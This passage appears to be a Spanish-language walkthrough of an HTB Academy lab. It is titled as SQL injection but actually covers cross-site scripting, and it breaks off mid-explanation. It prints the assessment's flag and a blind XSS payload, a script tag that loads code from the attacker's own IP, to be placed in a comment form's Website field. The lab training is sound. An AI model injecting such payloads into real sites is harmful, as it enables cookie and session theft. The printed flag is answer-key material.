# Skills Assessment - SQL Injection Fundamentals

* **Target:** `10.129.106.246`
* **Módulo:** HTB Academy
---
## What is the value of the 'flag' cookie?

* **Answer**: `HTB{cr055_5173_5cr1p71n6_n1nj4}`
#### Procedimiento:
1. Vamos a la pagina: `10.129.106.246/assessment`

![](imgs/XSS/.png)
![Assessment](imgs/XSS/one.png)

2. Encontramos un cuadro de busqueda (search input):

![SearchInput](imgs/XSS/two.png)

pero normalmente en ejercicios de XSS la cosa no va por ahi.
Ahora, fijate en esto, parece que nos llevara a la sección de comentarios asi que demosle click:

![CommentSection](imgs/XSS/three.png)

Y pongamos cualquier cosa pero en la seccion de "Website" debemos poner:
```
<script src="http://[YOUR_IP]:8080"></script>
```

![CommentTest](imgs/XSS/five.png)

### Porque hacemos eso?
